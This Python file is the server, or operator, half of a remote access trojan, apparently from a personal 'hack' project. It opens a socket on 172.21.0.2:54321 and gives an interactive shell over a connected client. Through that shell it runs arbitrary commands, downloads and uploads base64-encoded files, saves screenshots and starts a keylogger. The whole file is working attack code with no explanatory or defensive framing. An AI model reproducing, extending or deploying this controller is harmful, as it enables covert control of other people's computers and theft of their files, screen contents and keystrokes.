'''
Author: hibana2077 hibana2077@gmail.com
Date: 2024-06-04 11:00:21
LastEditors: hibana2077 hibana2077@gmail.com
LastEditTime: 2024-06-06 01:39:10
FilePath: \hack\server_edit.py
Description: 这是默认设置,请设置`customMade`, 打开koroFileHeader查看配置 进行设置: https://github.com/OBKoro1/koro1FileHeader/wiki/%E9%85%8D%E7%BD%AE
'''
import socket
import json
import base64
import datetime
import time
from rich import print as rprint

server_ip = "172.21.0.2"
server_port = 54321

def send_data(data, connection):
    """
    Sends the provided data to the specified connection.

    Args:
        data: The data to be sent.
        connection: The connection to send the data to.

    Returns:
        None
    """
    json_data = json.dumps(data)
    connection.send(bytes(json_data, encoding="utf-8"))

def receive_data(connection):
    """
    Receive data from a connection.

    Args:
        connection: The connection object to receive data from.

    Returns:
        The received data as a JSON object.

    Raises:
        ValueError: If the received data cannot be parsed as JSON.

    """
    json_data = bytearray()
    while True:
        try:
            json_data += connection.recv(1024)
            return json.loads(json_data)
        except ValueError:
            continue

# Set up server socket
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_socket.bind((server_ip, server_port))
server_socket.listen()

# Service starts
rprint("[bold green]Service Started[/bold green]")
client_connection, client_address = server_socket.accept()
rprint("[bold green]Client connected from:[/bold green]", client_address)

# Communication loop
while True:
    command = input(f"* Shell#~{str(client_address)}: ")
    send_data(command, client_connection)
    if command == "q":
        break
    elif command.startswith("cd ") and len(command) > 3:
        continue
    elif command.startswith("download"):  # From client to server
        file_data = receive_data(client_connection)
        if file_data[:4] != "[!!]":
            with open(command[9:], "wb") as file:
                file.write(base64.b64decode(file_data))
        else:
            print(file_data)
    elif command.startswith("upload"):
        try:
            with open(command[7:], "rb") as file:
                content = file.read()
                send_data(base64.b64encode(content).decode("ascii"), client_connection)
        except FileNotFoundError:
            error_message = "[!!] Fail to upload!"
            send_data(error_message, client_connection)
            print(error_message)
    elif command.startswith("screenshot"):
        image_data = receive_data(client_connection)
        if image_data[:4] != "[!!]":
            screenshot_file = "screen_" + str(client_address[0]) + datetime.datetime.now().strftime("_%Y-%m-%d_%H:%M:%S") + ".png"
            with open(screenshot_file, "wb") as image_file:
                image_file.write(base64.b64decode(image_data))
        else:
            print(image_data)
    elif command.startswith("keylog_start"):
        continue
    elif command.startswith("pwd"):
        result = receive_data(client_connection)
        rprint(f"[bold green]{result}[/bold green]")
        rprint(f"[bold green]{datetime.datetime.now()}[/bold green]")
    else:
        result = receive_data(client_connection)
        rprint(result)
        rprint(f"[bold green]{datetime.datetime.now()}[/bold green]")

# Close connection
rprint("[bold red]Connection closed[/bold red]")
server_socket.close()
